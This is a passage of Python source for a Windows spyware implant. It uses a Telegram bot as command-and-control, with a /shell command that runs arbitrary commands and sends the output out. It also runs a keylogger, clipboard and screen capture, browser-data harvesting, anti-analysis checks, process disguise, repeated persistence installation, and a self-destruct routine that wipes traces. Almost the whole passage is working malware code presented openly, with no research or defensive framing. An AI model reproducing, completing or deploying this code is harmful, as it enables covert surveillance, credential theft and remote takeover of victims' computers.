                time.sleep(self.check_interval * 2)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SELF-DESTRUCT MODULE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class SelfDestruct:
    """
    Telegram command listener — send /selfdestruct to CHAT_ID
    and the tool wipes all local traces, removes persistence, deletes itself.
    """
    def __init__(self, config, persistence, storage):
        self.config = config
        self.persistence = persistence
        self.storage = storage

    def _wipe_storage(self):
        for path in self.storage.paths:
            try:
                if os.path.exists(path):
                    # overwrite with random bytes first
                    size = os.path.getsize(path)
                    with open(path, 'wb') as f:
                        f.write(os.urandom(size))
                    os.remove(path)
            except Exception:
                pass

    def _remove_persistence(self):
        import winreg
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.DeleteValue(key, self.config.PROCESS_NAME)
            winreg.CloseKey(key)
        except Exception:
            pass

        startup = os.path.join(
            os.environ.get("APPDATA", ""),
            "Microsoft", "Windows", "Start Menu", "Programs", "Startup",
            f"{self.config.PROCESS_NAME}.lnk"
        )
        try:
            if os.path.exists(startup):
                os.remove(startup)
        except Exception:
            pass

        try:
            subprocess.run(
                ['schtasks', '/delete', '/tn', self.config.PROCESS_NAME, '/f'],
                capture_output=True, creationflags=0x08000000
            )
        except Exception:
            pass

    def _delete_self(self):
        exe_path = sys.executable
        bat = os.path.join(os.environ["TEMP"], f"cleanup_{random.randint(1000,9999)}.bat")
        with open(bat, 'w') as f:
            f.write(f'@echo off\n')
            f.write(f'ping 127.0.0.1 -n 3 > nul\n')
            f.write(f'del /f /q "{exe_path}"\n')
            f.write(f'del /f /q "{bat}"\n')

        subprocess.Popen(
            ['cmd', '/c', bat],
            creationflags=0x08000000,
            close_fds=True
        )

    def execute(self):
        self._wipe_storage()
        self._remove_persistence()
        self._delete_self()
        os._exit(0)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# TELEGRAM COMMAND LISTENER (for remote commands)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class CommandListener:
    def __init__(self, config, telegram, self_destruct, browser_harvester, recon):
        self.config = config
        self.telegram = telegram
        self.self_destruct = self_destruct
        self.browser_harvester = browser_harvester
        self.recon = recon
        self.last_update_id = 0

    def _get_updates(self):
        url = f"https://api.telegram.org/bot{self.config.BOT_TOKEN}/getUpdates"
        params = {"offset": self.last_update_id + 1, "timeout": 30}
        try:
            resp = requests.get(url, params=params, timeout=35)
            data = resp.json()
            return data.get("result", [])
        except Exception:
            return []

    def run(self):
        while True:
            try:
                updates = self._get_updates()
                for update in updates:
                    self.last_update_id = update["update_id"]
                    msg = update.get("message", {})
                    text = msg.get("text", "").strip().lower()
                    chat_id = str(msg.get("chat", {}).get("id", ""))

                    if chat_id != self.config.CHAT_ID:
                        continue

                    if text == "/selfdestruct":
                        self.telegram.send_message("💀 Self-destruct initiated. Wiping all traces...")
                        time.sleep(1)
                        self.self_destruct.execute()

                    elif text == "/harvest":
                        self.telegram.send_message("🔍 Harvesting browser data...")
                        self.browser_harvester.harvest()

                    elif text == "/recon":
                        self.telegram.send_message("🖥️ Running system recon...")
                        self.recon.run()

                    elif text == "/status":
                        uptime = time.time() - self.config.START_TIME
                        hrs = int(uptime // 3600)
                        mins = int((uptime % 3600) // 60)
                        self.telegram.send_message(
                            f"✅ ALIVE\n⏱️ Uptime: {hrs}h {mins}m\n"
                            f"🖥️ {platform.node()}"
                        )

                    elif text.startswith("/shell "):
                        cmd = msg.get("text", "").strip()[7:]
                        try:
                            result = subprocess.run(
                                cmd, shell=True, capture_output=True,
                                text=True, timeout=30,
                                creationflags=0x08000000
                            )
                            output = result.stdout + result.stderr
                            if not output.strip():
                                output = "(no output)"
                            for i in range(0, len(output), 4000):
                                self.telegram.send_message(f"💻 Shell:\n{output[i:i+4000]}")
                        except Exception as e:
                            self.telegram.send_message(f"⚠️ Shell error: {str(e)}")

                time.sleep(2)
            except Exception:
                time.sleep(10)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MAIN ORCHESTRATOR
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def main():
    # ── Anti-analysis gate ──
    if not AntiAnalysis.is_safe():
        sys.exit(0)

    # ── Silent dependency install ──
    SilentInstaller.install_all()

    # ── Initialize config ──
    config = Config()
    config.START_TIME = time.time()

    # ── Mutex (only one instance) ──
    mutex_name = MutexManager.generate_mutex(config)
    import ctypes
    mutex_handle = ctypes.windll.kernel32.CreateMutexW(None, True, mutex_name)
    if ctypes.windll.kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
        sys.exit(0)

    # ── Core modules ──
    storage = EncryptedStorage(config)
    telegram = TelegramDelivery(config)
    persistence = FiveLayerPersistence(config)
    recon = SystemRecon(config, telegram)

    # ── Install persistence ──
    persistence.install_all()

    # ── Disguise process ──
    ProcessDisguise.set_process_name(config.PROCESS_NAME)

        # ── Startup notification ──
    telegram.send_message(
        f"🟢 IMPLANT ONLINE\n"
        f"🖥️ Host: {platform.node()}\n"
        f"👤 User: {os.getlogin()}\n"
        f"🧬 OS: {platform.platform()}\n"
        f"🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"🔑 Mutex: {mutex_name}\n"
        f"📂 CWD: {os.getcwd()}"
    )

    # ── Run initial system recon ──
    try:
        recon.run()
    except Exception:
        pass

    # ── Initial browser harvest ──
    browser_harvester = BrowserHarvester(config, telegram, storage)
    try:
        browser_harvester.harvest()
    except Exception:
        pass

    # ── Self-destruct handler ──
    self_destruct = SelfDestruct(config, persistence, storage)

    # ── Command listener (Telegram C2) ──
    cmd_listener = CommandListener(config, telegram, self_destruct, browser_harvester, recon)

    # ── Build thread roster ──
    threads = []

    # Keylogger
    keylogger = KeyLogger(config, telegram, storage)
    threads.append(threading.Thread(target=keylogger.run, name="svchost_kl", daemon=True))

    # Clipboard monitor
    clipboard = ClipboardMonitor(config, telegram, storage)
    threads.append(threading.Thread(target=clipboard.run, name="svchost_cb", daemon=True))

    # Screenshot capture
    screencap = ScreenCapture(config, telegram)
    threads.append(threading.Thread(target=screencap.run, name="svchost_sc", daemon=True))

    # Window tracker
    wintrack = WindowTracker(config, telegram, storage)
    threads.append(threading.Thread(target=wintrack.run, name="svchost_wt", daemon=True))

    # Persistence watchdog
    watchdog = PersistenceWatchdog(persistence, config)
    threads.append(threading.Thread(target=watchdog.run, name="svchost_wd", daemon=True))

    # Telegram command listener (C2)
    threads.append(threading.Thread(target=cmd_listener.run, name="svchost_c2", daemon=True))

    # ── Launch all threads ──
    for t in threads:
        t.start()
        time.sleep(0.5)  # stagger to avoid burst resource spike

    # ── Heartbeat loop (keeps main alive + periodic status ping) ──
    heartbeat_interval = getattr(config, 'HEARTBEAT_INTERVAL', 3600)  # default 1hr
    reharvest_interval = getattr(config, 'REHARVEST_INTERVAL', 21600)  # default 6hrs
    last_harvest = time.time()

    while True:
        try:
            # ── Check thread health, restart any that died ──
            for i, t in enumerate(threads):
                if not t.is_alive():
                    # Rebuild the dead thread with the same target
                    new_t = threading.Thread(
                        target=t._target,
                        name=t.name,
                        daemon=True
                    )
                    new_t.start()
                    threads[i] = new_t
                    telegram.send_message(
                        f"⚠️ Thread `{t.name}` died — respawned."
                    )

            # ── Periodic heartbeat ──
            uptime = time.time() - config.START_TIME
            hrs = int(uptime // 3600)
            mins = int((uptime % 3600) // 60)
            active_count = sum(1 for t in threads if t.is_alive())
            telegram.send_message(
                f"💓 HEARTBEAT\n"
                f"⏱️ Uptime: {hrs}h {mins}m\n"
                f"🧵 Threads: {active_count}/{len(threads)} alive\n"
                f"🖥️ {platform.node()} | {os.getlogin()}"
            )

            # ── Periodic re-harvest browser data ──
            if time.time() - last_harvest >= reharvest_interval:
                try:
                    browser_harvester.harvest()
                    last_harvest = time.time()
                except Exception:
                    pass

            # ── Re-verify persistence each heartbeat ──
            try:
                persistence.install_all()
            except Exception:
                pass

            time.sleep(heartbeat_interval)

        except Exception:
            time.sleep(heartbeat_interval)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ENTRY POINT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
    except SystemExit:
        pass
    except Exception:
        # Silent failure — no tracebacks to console or disk
        pass
